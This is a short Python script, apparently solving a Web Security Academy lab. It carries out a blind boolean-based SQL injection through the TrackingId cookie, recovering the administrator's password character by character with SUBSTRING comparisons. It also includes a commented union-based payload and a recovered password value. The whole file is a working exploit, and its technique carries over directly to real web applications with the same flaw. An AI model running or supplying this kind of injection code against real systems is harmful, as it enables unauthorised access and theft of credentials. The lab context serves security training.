import string
import requests

uid = 'ac751fda1f68ed5880244a8b00b300bb'
url = 'https://' + uid + '.web-security-academy.net/filter?category='

# POSTGRESQL
# SUBSTRING(str, pos, len) 
# cookies = {'TrackingId':"QXEw7ba7drmk8bb9' UNION SELECT version()--;"}

k = ''

for j in range(1,50):
    for i in string.printable:
        payload = "' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password,1,"+str(j)+")='"+(k+i)+"'--"
        cookies = {'TrackingId':'xyz' + payload}
        r = requests.get(url, cookies=cookies)
        if 'Welcome back!' in r.text:
            k += i
            print(k)
            break

# l8we30kf7sp3t16i04co
